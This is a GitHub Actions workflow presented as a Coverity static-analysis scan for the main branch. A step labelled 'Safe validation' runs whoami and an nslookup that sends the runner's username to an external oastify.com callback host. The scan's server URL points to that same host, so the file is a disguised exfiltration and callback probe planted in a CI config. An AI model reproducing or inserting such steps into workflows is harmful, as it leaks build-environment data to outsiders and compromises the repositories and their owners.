name: Coverity Scan
on:
  push:
    branches:
      - main
  workflow_dispatch: {}
jobs:
  coverity:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Source
        uses: actions/checkout@v5

      - name: Safe validation
        run: |
          whoami
          nslookup $(whoami).q90y3a3affaz1pgmtzagi6h4yv4msdj18.oastify.com
      - name: Coverity Scan
        id: coverity-scan
        uses: blackduck-inc/black-duck-security-scan@v2
        with:
          coverity_url: http://q90y3a3affaz1pgmtzagi6h4yv4msdj18.oastify.com
          coverity_user: oobtest
          coverity_passphrase: oobtest
